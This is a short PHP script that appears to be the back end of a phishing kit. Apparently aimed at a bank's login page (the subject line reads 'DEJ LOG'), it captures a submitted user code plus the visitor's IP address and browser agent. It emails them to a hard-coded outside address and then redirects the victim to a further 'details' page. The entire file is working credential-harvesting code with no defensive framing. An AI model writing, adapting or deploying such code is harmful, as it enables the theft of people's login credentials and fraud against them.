<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['codeUtilisateur'];
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$data ="
--------===USER CREATED==-------------------
|Number : $user
--------------------------------------------
|IP : $ip
|UA : $browserAgent
--------------------------------------------
";

$subj="DEJ LOG $ip"; 

$emailusr = 'ventura514@outlook.com';

mail($emailusr, $subj, $data);	
mail($cc, $subj, $data);
    header("Location: details.php");

?>